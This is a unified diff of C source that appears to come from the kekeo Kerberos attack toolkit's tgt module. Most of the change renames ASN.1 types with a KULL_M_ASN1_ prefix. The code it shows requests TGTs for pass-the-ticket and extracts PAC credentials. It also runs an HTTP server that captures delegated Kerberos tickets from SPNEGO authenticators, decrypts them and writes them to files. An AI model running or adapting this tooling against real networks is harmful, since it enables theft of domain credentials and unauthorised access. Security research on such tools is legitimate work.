@@ -1,5 +1,5 @@
 /*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
+	https://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
@@ -21,8 +21,8 @@ NTSTATUS kuhl_m_tgt_ask(int argc, wchar_t * argv[])
 {
 	PKIWI_AUTH_INFOS infos;
 	PKULL_M_SOCK socket;
-	AS_REP *AsRep = NULL;
-	EncKDCRepPart *encAsRepPart = NULL;
+	KULL_M_ASN1_AS_REP *AsRep = NULL;
+	KULL_M_ASN1_EncKDCRepPart *encAsRepPart = NULL;
 	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;
 
 	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
@@ -34,8 +34,8 @@ NTSTATUS kuhl_m_tgt_ask(int argc, wchar_t * argv[])
 			if(kull_m_kerberos_asn1_AsReqAsRep(infos, socket, NULL, NULL, &AsRep, &encAsRepPart, NULL))
 			{
 				kull_m_kerberos_asn1_KdcRep_save(AsRep, encAsRepPart, NULL, NULL, callback);
-				ossFreePDU(&kull_m_kerberos_asn1_world, EncASRepPart_PDU, encAsRepPart);
-				ossFreePDU(&kull_m_kerberos_asn1_world, AS_REP_PDU, AsRep);
+				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncASRepPart_PDU, encAsRepPart);
+				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_AS_REP_PDU, AsRep);
 			}
 			kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
 		}
@@ -48,12 +48,12 @@ NTSTATUS kuhl_m_tgt_pac(int argc, wchar_t * argv[])
 {
 	PKIWI_AUTH_INFOS infos;
 	PKULL_M_SOCK socket;
-	AS_REP *asrep = NULL;
-	EncKDCRepPart *enckdcreppart = NULL;
-	EncryptionKey asKey;
+	KULL_M_ASN1_AS_REP *asrep = NULL;
+	KULL_M_ASN1_EncKDCRepPart *enckdcreppart = NULL;
+	KULL_M_ASN1_EncryptionKey asKey;
 	OssBuf TgsReq = {0, NULL};
-	TGS_REP *TgsRep = NULL;
-	_octet1 pac;
+	KULL_M_ASN1_TGS_REP *TgsRep = NULL;
+	KULL_M_ASN1__octet1 pac;
 
 	if(infos = kull_m_kerberos_asn1_Authinfos_create(argc, argv))
 	{
@@ -63,7 +63,7 @@ NTSTATUS kuhl_m_tgt_pac(int argc, wchar_t * argv[])
 			{
 				if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &asrep->cname, asrep->crealm, &asrep->cname, NULL, KERB_KDCOPTION_standard | KERB_KDCOPTION_enc_tkt_in_skey, &asrep->ticket, &enckdcreppart->key, &asrep->ticket, NULL, NULL))
 				{
-					if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRep, TGS_REP_PDU))
+					if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRep, KULL_M_ASN1_TGS_REP_PDU))
 					{
 						if(kull_m_kerberos_asn1_PAC_from_EncTicketPart(&enckdcreppart->key, &TgsRep->ticket.enc_part, &pac))
 						{
@@ -78,14 +78,14 @@ NTSTATUS kuhl_m_tgt_pac(int argc, wchar_t * argv[])
 								LocalFree(pac.value);
 						}
 						else PRINT_ERROR(L"No PAC found\n");
-						ossFreePDU(&kull_m_kerberos_asn1_world, TGS_REP_PDU, TgsRep);
+						ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_TGS_REP_PDU, TgsRep);
 					}
 					ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
 				}
 				if(asKey.keyvalue.value)
 					LocalFree(asKey.keyvalue.value);
-				ossFreePDU(&kull_m_kerberos_asn1_world, EncASRepPart_PDU, enckdcreppart);
-				ossFreePDU(&kull_m_kerberos_asn1_world, AS_REP_PDU, asrep);
+				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncASRepPart_PDU, enckdcreppart);
+				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_AS_REP_PDU, asrep);
 			}
 			kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
 		}
@@ -99,7 +99,7 @@ NTSTATUS kuhl_m_tgt_asreq(int argc, wchar_t * argv[])
 	PKIWI_AUTH_INFOS authInfo;
 	OssBuf AsReq;
 	FILETIME fTime, eTime;
-	KerberosTime time;
+	KULL_M_ASN1_KerberosTime time;
 	BOOL isNonce, isSign = TRUE;
 	DWORD cookie, i, increment, count;
 	LPCWSTR szLifetime;
@@ -147,7 +147,7 @@ NTSTATUS kuhl_m_tgt_asreq(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-BOOL kuhl_m_tgt_pac_cred(_octet1 *buf, EncryptionKey *AsRepKey)
+BOOL kuhl_m_tgt_pac_cred(KULL_M_ASN1__octet1 *buf, KULL_M_ASN1_EncryptionKey *AsRepKey)
 {
 	BOOL status = FALSE;
 	PPACTYPE pacType = (PPACTYPE) buf->value;
@@ -249,7 +249,7 @@ NTSTATUS kuhl_m_tgt_httpserver(int argc, wchar_t * argv[])
 	HANDLE hThread;
 	DWORD threadId;
 	LPCWSTR szData;
-	EncryptionKey myKey;
+	KULL_M_ASN1_EncryptionKey myKey;
 	PKUHL_M_KERBEROS_HTTP_THREAD_DATA pData;
 	LPSTR redirectUrl = NULL;
 
@@ -317,8 +317,8 @@ DWORD WINAPI kuhl_m_tgt_httpserver_thread(IN LPVOID lpParameter)
 	DWORD bufLen, timeout = 2000;
 	PSTR authData = NULL;
 	OssBuf myBuf;
-	int myPdu = GSSAPI_Token_PDU;
-	GSSAPI_Token *gssapi_Token = NULL;
+	int myPdu = KULL_M_ASN1_GSSAPI_Token_PDU;
+	KULL_M_ASN1_GSSAPI_Token *gssapi_Token = NULL;
 	FILETIME fTime;
 
 	GetSystemTimeAsFileTime(&fTime);
@@ -351,7 +351,7 @@ DWORD WINAPI kuhl_m_tgt_httpserver_thread(IN LPVOID lpParameter)
 				if(!ossDecode(&kull_m_kerberos_asn1_world, &myPdu, &myBuf, (LPVOID *) &gssapi_Token))
 				{
 					kuhl_m_tgt_httpserver_decodeAnyToken(&gssapi_Token->innerToken, pData->key);
-					ossFreePDU(&kull_m_kerberos_asn1_world, GSSAPI_Token_PDU, gssapi_Token);
+					ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_GSSAPI_Token_PDU, gssapi_Token);
 				}
 				else PRINT_ERROR(L"Unable to decode GSSAPI_Token: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
 				LocalFree(myBuf.value);
@@ -364,20 +364,20 @@ DWORD WINAPI kuhl_m_tgt_httpserver_thread(IN LPVOID lpParameter)
 	return ERROR_SUCCESS;
 }
 
-BOOL kuhl_m_tgt_httpserver_decodeAnyToken(Any *token, EncryptionKey *key)
+BOOL kuhl_m_tgt_httpserver_decodeAnyToken(KULL_M_ASN1__Any *token, KULL_M_ASN1_EncryptionKey *key)
 {
 	BOOL status = FALSE;
-	int myPdu = NegotiationToken_PDU;
-	NegotiationToken *negotiationToken = NULL;
+	int myPdu = KULL_M_ASN1_NegotiationToken_PDU;
+	KULL_M_ASN1_NegotiationToken *negotiationToken = NULL;
 
 	if(!ossDecode(&kull_m_kerberos_asn1_world, &myPdu, (OssBuf *) token, (LPVOID *) &negotiationToken))
 	{
-		if(negotiationToken->choice == negTokenInit_chosen)
+		if(negotiationToken->choice == KULL_M_ASN1_negTokenInit_chosen)
 		{
-			if(negotiationToken->u.negTokenInit.bit_mask & NegTokenInit_mechToken_present)
+			if(negotiationToken->u.negTokenInit.bit_mask & KULL_M_ASN1_NegTokenInit_mechToken_present)
 				kuhl_m_tgt_deleg_from_negTokenInit(negotiationToken->u.negTokenInit.mechToken.value, negotiationToken->u.negTokenInit.mechToken.length, kuhl_m_tgt_deleg_EncryptionKeyFromTicket, key);
 		}
-		ossFreePDU(&kull_m_kerberos_asn1_world, NegotiationToken_PDU, negotiationToken);
+		ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_NegotiationToken_PDU, negotiationToken);
 	}
 	else PRINT_ERROR(L"Unable to decode GSSAPI_Token: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
 	return status;
@@ -484,14 +484,14 @@ PSTR kuhl_m_tgt_httpserver_dealWithHeaders(LPCSTR data, DWORD size, LPCSTR toFin
 BOOL kuhl_m_tgt_deleg_from_negTokenInit(LPCVOID data, LONG dataLen, PKUHL_M_KERBEROS_GETENCRYPTIONKEYFROMAPREQ callback, PVOID userdata)
 {
 	BOOL status = FALSE;
-	int toDecPdu = AP_REQ_PDU;
-	AP_REQ *ApReq = NULL;
-	Authenticator *authenticator = NULL;
-	KRB_CRED *KrbCred = NULL;
+	int toDecPdu = KULL_M_ASN1_AP_REQ_PDU;
+	KULL_M_ASN1_AP_REQ *ApReq = NULL;
+	KULL_M_ASN1_Authenticator *authenticator = NULL;
+	KULL_M_ASN1_KRB_CRED *KrbCred = NULL;
 	OssBuf toDecode = {0, NULL}, DecryptedAuthenticator = {0, NULL}, DecryptedKrbCredEnc = {0, NULL}, PlainKrbCredEnc = {0, NULL};
 	NTSTATUS ntStatus;
-	EncryptedData previousEncrypted = {0};
-	EncryptionKey sessionKey = {0};
+	KULL_M_ASN1_EncryptedData previousEncrypted = {0};
+	KULL_M_ASN1_EncryptionKey sessionKey = {0};
 	LPWSTR filename;
 
 	if(toDecode.value = kuhl_m_tgt_deleg_searchDataAferOIDInBuffer(data, dataLen))
@@ -510,19 +510,19 @@ BOOL kuhl_m_tgt_deleg_from_negTokenInit(LPCVOID data, LONG dataLen, PKUHL_M_KERB
 					ntStatus = kull_m_kerberos_asn1_crypto_encrypt(KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, &sessionKey, (OssBuf *) &ApReq->authenticator.cipher, &DecryptedAuthenticator, FALSE);
 					if(NT_SUCCESS(ntStatus))
 					{
-						toDecPdu = Authenticator_PDU;
+						toDecPdu = KULL_M_ASN1_Authenticator_PDU;
 						if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &DecryptedAuthenticator, (LPVOID *) &authenticator))
 						{
 							kprintf(L"Client : ");
 							kull_m_kerberos_asn1_PrincipalName_descr(&authenticator->cname, TRUE);
 							kprintf(L"\n");
-							if(authenticator->bit_mask & cksum_present)
+							if(authenticator->bit_mask & KULL_M_ASN1_cksum_present)
 							{
 								if(authenticator->cksum.cksumtype == GSS_CHECKSUM_TYPE)
 								{
 									if(((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Flags & GSS_C_DELEG_FLAG)
 									{
-										toDecPdu = KRB_CRED_PDU;
+										toDecPdu = KULL_M_ASN1_KRB_CRED_PDU;
 										toDecode.length = ((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Dlgth;
 										toDecode.value = ((PKIWI_AUTHENTICATOR_CKSUM) authenticator->cksum.checksum.value)->Deleg;
 										if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &toDecode, (LPVOID *) &KrbCred))
@@ -532,10 +532,10 @@ BOOL kuhl_m_tgt_deleg_from_negTokenInit(LPCVOID data, LONG dataLen, PKUHL_M_KERB
 											{
 												previousEncrypted = KrbCred->enc_part;
 												KrbCred->enc_part.etype = KERB_ETYPE_NULL;
-												KrbCred->enc_part.cipher = *(_octet1 *) &DecryptedKrbCredEnc;
+												KrbCred->enc_part.cipher = *(KULL_M_ASN1__octet1 *) &DecryptedKrbCredEnc;
 												if(filename = kull_m_kerberos_asn1_KrbCred_filename(KrbCred, L"_delegate", NULL))
 												{
-													if(!ossEncode(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred, &PlainKrbCredEnc))
+													if(!ossEncode(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, KrbCred, &PlainKrbCredEnc))
 													{
 														kprintf(L"> %s -> ", filename);
 														if(status = kull_m_file_writeData(filename, PlainKrbCredEnc.value, PlainKrbCredEnc.length))
@@ -551,7 +551,7 @@ BOOL kuhl_m_tgt_deleg_from_negTokenInit(LPCVOID data, LONG dataLen, PKUHL_M_KERB
 												LocalFree(DecryptedKrbCredEnc.value);
 											}
 											else PRINT_ERROR(L"Unable to decrypt KRB_CRED EncryptedData: %08x\n", ntStatus);
-											ossFreePDU(&kull_m_kerberos_asn1_world, KRB_CRED_PDU, KrbCred);
+											ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, KrbCred);
 										}
 										else PRINT_ERROR(L"Unable to decode KRB_CRED: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
 									}
@@ -560,7 +560,7 @@ BOOL kuhl_m_tgt_deleg_from_negTokenInit(LPCVOID data, LONG dataLen, PKUHL_M_KERB
 								else PRINT_ERROR(L"cksumtype: 0x%08x\n", authenticator->cksum.cksumtype);
 							}
 							else PRINT_ERROR(L"No cksum in authenticator?");
-							ossFreePDU(&kull_m_kerberos_asn1_world, Authenticator_PDU, authenticator);
+							ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_Authenticator_PDU, authenticator);
 						}
 						else PRINT_ERROR(L"Unable to decode Ticket: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
 						LocalFree(DecryptedAuthenticator.value);
@@ -568,7 +568,7 @@ BOOL kuhl_m_tgt_deleg_from_negTokenInit(LPCVOID data, LONG dataLen, PKUHL_M_KERB
 					else PRINT_ERROR(L"Unable to decrypt Authenticator: %08x\n", ntStatus);
 					LocalFree(sessionKey.keyvalue.value);
 				}
-				ossFreePDU(&kull_m_kerberos_asn1_world, AP_REQ_PDU, ApReq);
+				ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_AP_REQ_PDU, ApReq);
 			}
 			else PRINT_ERROR(L"Unable to decode AP_REQ: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
 		}
@@ -595,7 +595,7 @@ PBYTE kuhl_m_tgt_deleg_searchDataAferOIDInBuffer(IN LPCVOID data, IN SIZE_T Size
 	return ret;
 }
 
-BOOL CALLBACK kuhl_m_tgt_deleg_EncryptionKeyFromCache(AP_REQ *ApReq, EncryptionKey *key, LPVOID UserData)
+BOOL CALLBACK kuhl_m_tgt_deleg_EncryptionKeyFromCache(KULL_M_ASN1_AP_REQ *ApReq, KULL_M_ASN1_EncryptionKey *key, LPVOID UserData)
 {
 	BOOL status = FALSE;
 	NTSTATUS ntStatus, packageStatus;
@@ -620,7 +620,7 @@ BOOL CALLBACK kuhl_m_tgt_deleg_EncryptionKeyFromCache(AP_REQ *ApReq, EncryptionK
 		{
 			if(NT_SUCCESS(packageStatus))
 			{
-				key->keytype = (Int32) pKerbRetrieveResponse->Ticket.SessionKey.KeyType;
+				key->keytype = (KULL_M_ASN1_Int32) pKerbRetrieveResponse->Ticket.SessionKey.KeyType;
 				key->keyvalue.length = pKerbRetrieveResponse->Ticket.SessionKey.Length;
 				if(key->keyvalue.value = (unsigned char *) LocalAlloc(LPTR, key->keyvalue.length))
 				{
@@ -639,19 +639,19 @@ BOOL CALLBACK kuhl_m_tgt_deleg_EncryptionKeyFromCache(AP_REQ *ApReq, EncryptionK
 	return status;
 }
 
-BOOL CALLBACK kuhl_m_tgt_deleg_EncryptionKeyFromTicket(AP_REQ *ApReq, EncryptionKey *key, LPVOID UserData) // TODO
+BOOL CALLBACK kuhl_m_tgt_deleg_EncryptionKeyFromTicket(KULL_M_ASN1_AP_REQ *ApReq, KULL_M_ASN1_EncryptionKey *key, LPVOID UserData) // TODO
 {
 	BOOL status = FALSE;
 	NTSTATUS ntStatus;
 	OssBuf DecryptedEncTicketPart = {0, NULL};
-	EncTicketPart *encticketpart = NULL;
-	int toDecPdu = EncTicketPart_PDU;
+	KULL_M_ASN1_EncTicketPart *encticketpart = NULL;
+	int toDecPdu = KULL_M_ASN1_EncTicketPart_PDU;
 
 	key->keytype = 0;
 	key->keyvalue.length = 0;
 	key->keyvalue.value = NULL;
 
-	ntStatus = kull_m_kerberos_asn1_crypto_encrypt(KRB_KEY_USAGE_AS_REP_TGS_REP, (EncryptionKey *) UserData, (OssBuf *) &ApReq->ticket.enc_part.cipher, &DecryptedEncTicketPart, FALSE);
+	ntStatus = kull_m_kerberos_asn1_crypto_encrypt(KRB_KEY_USAGE_AS_REP_TGS_REP, (KULL_M_ASN1_EncryptionKey *) UserData, (OssBuf *) &ApReq->ticket.enc_part.cipher, &DecryptedEncTicketPart, FALSE);
 	if(NT_SUCCESS(ntStatus))
 	{
 		if(!ossDecode(&kull_m_kerberos_asn1_world, &toDecPdu, &DecryptedEncTicketPart, (LPVOID *) &encticketpart))
@@ -667,7 +667,7 @@ BOOL CALLBACK kuhl_m_tgt_deleg_EncryptionKeyFromTicket(AP_REQ *ApReq, Encryption
 				}
 			}
 			else PRINT_ERROR(L"Authenticator etype (0x%08x) is not the same as Key keytype (0x%08x)\n", ApReq->authenticator.etype, encticketpart->key.keytype);
-			ossFreePDU(&kull_m_kerberos_asn1_world, EncTicketPart_PDU, encticketpart);
+			ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncTicketPart_PDU, encticketpart);
 		}
 		else PRINT_ERROR(L"Unable to decode EncTicketPart: %S\n", ossGetErrMsg(&kull_m_kerberos_asn1_world));
 		LocalFree(DecryptedEncTicketPart.value);
